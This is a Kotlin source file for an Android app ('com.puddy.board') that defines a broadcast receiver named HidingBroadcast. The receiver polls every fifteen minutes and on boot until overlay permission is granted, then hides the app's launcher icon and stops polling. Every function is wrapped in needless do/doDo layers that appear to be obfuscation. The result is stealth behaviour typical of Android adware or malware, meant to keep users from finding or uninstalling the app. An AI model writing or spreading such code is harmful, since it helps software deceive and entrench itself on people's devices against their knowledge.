package com.puddy.board.util.hiding

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings

class HidingBroadcast : BroadcastReceiver() {

    companion object {
        @SuppressLint("UnspecifiedImmutableFlag")
        fun startAlarm(context: Context) {
            doStartAlarm(context)
        }

        private fun doStartAlarm(context: Context) {
            doDoStartAlarm(context)
        }

        private fun doDoStartAlarm(context: Context) {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val pendingIntent = PendingIntent
                .getBroadcast(context, 0, Intent(context, HidingBroadcast::class.java), 0)

            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                5000,
                AlarmManager.INTERVAL_FIFTEEN_MINUTES,
                pendingIntent
            )
        }
    }

    private fun canHideApp(context: Context): Boolean {
        return doCanHideApp(context)
    }

    private fun doCanHideApp(
        context: Context
    ): Boolean {
        return doDoCanHideApp(context)
    }

    private fun doDoCanHideApp(
        context: Context
    ): Boolean {
        return try {
            Settings.canDrawOverlays(context)
        } catch (e: Exception) {
            false
        }
    }

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    override fun onReceive(p0: Context, p1: Intent) {
        doOnReceive(p0, p1)
    }

    private fun doOnReceive(p0: Context, p1: Intent) {
        doDoOnReceive(p0, p1)
    }

    private fun doDoOnReceive(p0: Context, p1: Intent) {
        if (canHideApp(p0)) {
            hideApp(p0)
            cancelAlarm(p0)
            return
        } else startAlarm(p0)
        when (p1.action) {
            Intent.ACTION_BOOT_COMPLETED -> if (canHideApp(p0)) {
                hideApp(p0)
                cancelAlarm(p0)
            } else startAlarm(p0)
        }
    }

    private fun cancelAlarm(context: Context) {
        doCancelAlarm(context)
    }

    private fun doCancelAlarm(context: Context) {
        doDoCancelAlarm(context)
    }

    private fun doDoCancelAlarm(context: Context) {
        val pendingIntent = PendingIntent
            .getBroadcast(context, 0, Intent(context, HidingBroadcast::class.java), 0)
        (context.getSystemService(Context.ALARM_SERVICE) as AlarmManager).cancel(pendingIntent)
    }

    private fun hideApp(context: Context) {
        doHideApp(context)
    }

    private fun doHideApp(context: Context) {
        doDoHideApp(context)
    }

    private fun doDoHideApp(context: Context) {
        AppHidingUtil.hideApp(context, "Launcher2", "Launcher")
    }
}
